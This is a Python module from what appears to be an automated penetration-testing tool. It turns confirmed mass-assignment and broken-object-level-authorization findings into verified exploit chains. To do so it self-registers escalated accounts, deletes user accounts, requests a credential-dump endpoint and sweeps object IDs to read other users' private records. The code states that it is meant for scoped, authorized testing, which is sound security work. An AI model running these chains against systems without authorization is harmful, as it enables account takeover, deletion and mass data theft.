"""
core/cortex/kill_chain.py

Kill-chain composer — turn CONFIRMED undefended-class findings into a VERIFIED
exploit chain by *executing* it, not narrating it.

The chain ensemble (chain_arbiter) PROPOSES hypothesized chains and scores them.
This is the proof-grade complement: given a confirmed escalation primitive (a
mass-assignment that sets admin/role at registration), it mints a normal principal
AND an escalated one and differential-tests privileged operations. A hop is
VERIFIED only when the normal principal is DENIED and the escalated principal is
ALLOWED — proving the escalation grants real capability, not that the operation is
simply open to everyone (the false-positive that sinks naive chain narrators).

Output is a `KillChain` at epistemic VERIFIED — the concrete, reproduced impact of
the mass-assignment flaw (e.g. "anyone can self-register, escalate to admin, then
delete any account"). It can be surfaced as a finding and registered as a top-rank
OBSERVED/VERIFIED proposal for the arbiter.

Safety: every destructive verification targets ONLY a throwaway principal this
module itself created. It never touches a pre-existing user or object. Callers
MUST still gate execution (active mode, scope, authorized target).
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from core.cortex.chain_arbiter import ChainProposal
from core.cortex.chain_verifier import VERIFIED
from core.cortex.escalation_amplification import verify_escalation_amplifies_bola
from core.wraith.bola_scale import sweep_object_ids
from core.wraith.logic_probe import register_and_login

logger = logging.getLogger(__name__)

Send = Callable[[str, str, Optional[Dict[str, Any]]], Awaitable[Tuple[int, Any]]]


@dataclass
class PrivilegedOp:
    """A candidate operation that should be denied to a normal principal."""
    method: str
    path: str                 # may contain {victim}
    kind: str                 # human description of the capability
    needs_victim: bool = False  # destructive → target a throwaway principal only


# Common privileged operations. The differential gate (normal DENIED, escalated
# ALLOWED) keeps this honest: an op that isn't actually gated is silently dropped,
# so a generous list costs nothing in false positives.
_BUILTIN_OPS: List[PrivilegedOp] = [
    PrivilegedOp("DELETE", "/users/v1/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("DELETE", "/api/Users/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("DELETE", "/users/{victim}", "delete any user account", needs_victim=True),
    PrivilegedOp("GET", "/users/v1/_debug", "dump every user's credentials"),
    PrivilegedOp("GET", "/api/Users", "enumerate all user accounts"),
    PrivilegedOp("GET", "/administration", "reach the admin console"),
    PrivilegedOp("GET", "/api/admin", "reach the admin API"),
    PrivilegedOp("GET", "/admin", "reach the admin area"),
]


@dataclass
class ChainHop:
    label: str
    verified: bool
    evidence: str


_CHAIN_TYPE = {
    "privilege_escalation": "Verified Exploit Chain (privilege escalation)",
    "data_exposure": "Verified Exploit Chain (mass data exposure)",
    "amplified_bola": "Verified Exploit Chain (escalation-amplified BOLA)",
}
_CHAIN_TAGS = {
    "privilege_escalation": ["privilege_escalation", "bfla"],
    "data_exposure": ["mass_data_exposure", "bola", "idor"],
    "amplified_bola": ["privilege_escalation", "bola", "idor", "amplified"],
}
_CHAIN_INVARIANT = {
    "privilege_escalation": "Privileged operations must require a server-authorized privilege.",
    "data_exposure": "A user may read only their own records.",
    "amplified_bola": ("A role's object access must stay within its intended account/tenant "
                       "boundary and must not expand via self-service escalation."),
}


@dataclass
class KillChain:
    origin: str
    goal: str
    hops: List[ChainHop]
    severity: str = "CRITICAL"
    kind: str = "privilege_escalation"   # privilege_escalation | data_exposure

    def steps(self) -> List[str]:
        return [h.label for h in self.hops]

    def to_finding(self) -> Dict[str, Any]:
        return {
            "type": _CHAIN_TYPE.get(self.kind, "Verified Exploit Chain"),
            "severity": self.severity,
            "tool": "kill_chain",
            "target": self.origin,
            "message": "Verified kill chain → " + self.goal + ". " + "  →  ".join(self.steps()),
            "tags": ["verified", "exploit_chain", "broken_access_control"] + _CHAIN_TAGS.get(self.kind, []),
            "families": ["confirmed_vuln"],
            "metadata": {
                "vuln_class": "exploit_chain",
                "kind": self.kind,
                "epistemic": VERIFIED,
                "goal": self.goal,
                "intended_invariant": _CHAIN_INVARIANT.get(self.kind, "Server-side authorization must hold."),
                "observed_violation": self.goal,
                "hops": [{"label": h.label, "verified": h.verified, "evidence": h.evidence}
                         for h in self.hops],
            },
        }

    def to_proposal(self) -> ChainProposal:
        """Surface the chain to the arbiter at the top of the epistemic ladder."""
        return ChainProposal(
            source="composer",
            method="active-verification",
            epistemic=VERIFIED,
            steps=self.steps(),
            length=len(self.hops),
            score=1.0,
            confidence=0.99,
            goal=self.goal,
            raw={"severity": self.severity},
        )


async def compose_privilege_chain(
    target: str,
    *,
    register: Tuple[str, Any],
    login: Tuple[str, Any],
    privilege_field: str,
    privilege_value: Any,
    post: Send,
    authed_send: Callable[[str], Send],
    extra_ops: Optional[List[PrivilegedOp]] = None,
    max_ops: int = 12,
) -> Optional[KillChain]:
    """Actively verify that a confirmed mass-assignment escalation grants real
    privileged capability, composing a VERIFIED kill chain. Best-effort; None when
    no privileged operation is differentially confirmed.
    """
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Mint a normal principal and an escalated one (escalated via the confirmed
    # mass-assignment vector — the same field/value the finding proved is trusted).
    normal = await register_and_login(origin, post, register, login)
    admin = await register_and_login(origin, post, register, login,
                                     extra_fields={privilege_field: privilege_value})
    if not normal or not admin:
        return None
    (tok_n, _), (tok_a, _) = normal, admin
    if tok_n == tok_a:
        return None
    send_n, send_a = authed_send(tok_n), authed_send(tok_a)

    verified: List[Tuple[PrivilegedOp, int, int]] = []
    for op in (list(_BUILTIN_OPS) + list(extra_ops or []))[:max_ops]:
        url = origin + op.path
        if op.needs_victim:
            # Destructive: target ONLY a throwaway principal we just created.
            victim = await register_and_login(origin, post, register, login)
            if not victim:
                continue
            url = origin + op.path.replace("{victim}", str(victim[1]["username"]))

        # Differential honesty gate. The normal principal MUST be denied first —
        # otherwise the op is open to everyone and is not a privilege boundary.
        try:
            st_n, _ = await send_n(op.method, url, None)
        except Exception:
            continue
        if int(st_n) < 400:
            continue
        try:
            st_a, _ = await send_a(op.method, url, None)
        except Exception:
            continue
        if 200 <= int(st_a) < 300:
            verified.append((op, int(st_n), int(st_a)))
            logger.info("[kill_chain] verified hop: %s %s (normal=%s denied, escalated=%s allowed)",
                        op.method, op.path, st_n, st_a)

    if not verified:
        return None

    hops = [
        ChainHop("Anonymous self-registration is accepted", True,
                 f"POST {register[0]} succeeds for an unauthenticated client"),
        ChainHop(f"Privilege escalation via mass assignment: client sets "
                 f"{privilege_field}={privilege_value!r} at registration", True,
                 "confirmed by the mass-assignment finding (differential persistence)"),
    ]
    for op, st_n, st_a in verified:
        hops.append(ChainHop(
            f"Escalated principal can {op.kind} ({op.method} {op.path})", True,
            f"normal principal denied (HTTP {st_n}); escalated principal allowed (HTTP {st_a})"))

    goal = "Full administrative compromise — " + "; ".join(op.kind for op, _, _ in verified)
    return KillChain(origin=origin, goal=goal, hops=hops)


async def compose_data_exposure_chain(
    target: str,
    scale_findings: List[Dict[str, Any]],
    *,
    register: Tuple[str, Any],
    login: Tuple[str, Any],
    post: Send,
    authed_send: Callable[[str], Send],
    min_owners: int = 3,
    max_ids: int = 12,
) -> Optional[KillChain]:
    """Compose the data-exposure chain: a brand-new anonymous registration that
    immediately reads the whole population's private objects. Unlike a cosmetic
    merge of findings, this RE-RUNS the enumeration from a fresh principal, proving
    `register -> mass data exposure` executes end-to-end from zero. Best-effort.
    """
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    principal = await register_and_login(origin, post, register, login)
    if not principal:
        return None
    tok, ident = principal
    send = authed_send(tok)
    own = {str(ident.get("email")), str(ident.get("username"))}

    confirmed = []
    seen: set = set()
    for f in scale_findings or []:
        ep = (f.get("metadata") or {}).get("endpoint")
        if not ep or "{id}" not in ep or ep in seen:
            continue
        seen.add(ep)
        url_tmpl = ep if ep.startswith("http") else origin + ep
        try:
            r = await sweep_object_ids("GET", url_tmpl, send, own_identity=own,
                                       ids=range(1, max_ids + 1), min_owners=min_owners,
                                       max_requests=max_ids)
        except Exception:
            r = None
        if r:
            confirmed.append(r)
    if not confirmed:
        return None

    hops = [ChainHop("Anonymous self-registration is accepted", True,
                     f"POST {register[0]} succeeds for an unauthenticated client")]
    for r in confirmed:
        hops.append(ChainHop(
            f"That brand-new account reads {r.accessed} other users' private objects "
            f"across {r.distinct_owners} distinct owners via {r.method} {r.endpoint}", True,
            f"re-verified end-to-end from a fresh registration "
            f"(owner field '{r.owner_field}', ids {r.id_range})"))
    worst = max(r.distinct_owners for r in confirmed)
    goal = ("Full population data exposure — any anonymous user can self-register and "
            f"read the entire user base's private records ({worst}+ distinct owners)")
    return KillChain(origin=origin, goal=goal, hops=hops, severity="CRITICAL", kind="data_exposure")


async def compose_amplified_bola_chain(
    target: str,
    *,
    baseline_send: Send,
    candidate_refs: List[str],
) -> Optional[KillChain]:
    """Compose the escalation-amplified-BOLA chain: a low-priv principal is denied a
    set of objects, escalates its own role via profile mass assignment, and then
    reads those previously-denied objects. The hop is confirmed by the denied→allowed
    differential across the boundary the attacker crossed. Best-effort."""
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    res = await verify_escalation_amplifies_bola(origin, baseline_send, candidate_refs=candidate_refs)
    if res is None:
        return None
    sample = ", ".join(u.rsplit("/", 1)[-1] for u, _ in res.amplified[:5])
    hops = [
        ChainHop(f"Low-priv principal (role={res.role_before!r}) is denied "
                 f"{res.baseline_denied} object(s)", True,
                 "baseline returns 401/403 on those objects"),
        ChainHop(f"Privilege escalation via {res.vector}: role "
                 f"{res.role_before!r} → {res.role_after!r}", True,
                 "profile-update mass assignment, confirmed by re-reading the profile"),
        ChainHop(f"The escalated principal now reads {res.count} previously-denied "
                 f"object(s) ({sample})", True,
                 f"denied→allowed across the privilege boundary; e.g. {res.amplified[0][1]}"),
    ]
    goal = (f"Escalation-amplified BOLA — {res.role_before!r}→{res.role_after!r} "
            f"expands object access to {res.count} previously-forbidden object(s)")
    return KillChain(origin=origin, goal=goal, hops=hops, severity="CRITICAL", kind="amplified_bola")


async def compose_chains(
    target: str,
    *,
    register: Tuple[str, Any],
    login: Tuple[str, Any],
    post: Send,
    authed_send: Callable[[str], Send],
    mass_assign_finding: Optional[Dict[str, Any]] = None,
    scale_findings: Optional[List[Dict[str, Any]]] = None,
    baseline_send: Optional[Send] = None,
    candidate_refs: Optional[List[str]] = None,
) -> List[KillChain]:
    """Assemble every verified kill chain the confirmed primitives support:
    privilege escalation (mass assignment -> admin-only op), data exposure
    (anonymous registration -> systemic BOLA), and escalation-amplified BOLA
    (low-priv denied -> self-escalate -> read previously-denied). Best-effort."""
    chains: List[KillChain] = []
    if mass_assign_finding:
        m = mass_assign_finding.get("metadata") or {}
        if m.get("field") is not None:
            try:
                c = await compose_privilege_chain(
                    target, register=register, login=login,
                    privilege_field=m["field"], privilege_value=m.get("injected"),
                    post=post, authed_send=authed_send,
                )
                if c:
                    chains.append(c)
            except Exception as e:
                logger.debug("[kill_chain] privilege chain failed: %s", e)
    if scale_findings:
        try:
            c = await compose_data_exposure_chain(
                target, scale_findings, register=register, login=login,
                post=post, authed_send=authed_send,
            )
            if c:
                chains.append(c)
        except Exception as e:
            logger.debug("[kill_chain] data-exposure chain failed: %s", e)
    if baseline_send is not None and candidate_refs:
        try:
            c = await compose_amplified_bola_chain(
                target, baseline_send=baseline_send, candidate_refs=candidate_refs)
            if c:
                chains.append(c)
        except Exception as e:
            logger.debug("[kill_chain] amplified-BOLA chain failed: %s", e)
    return chains
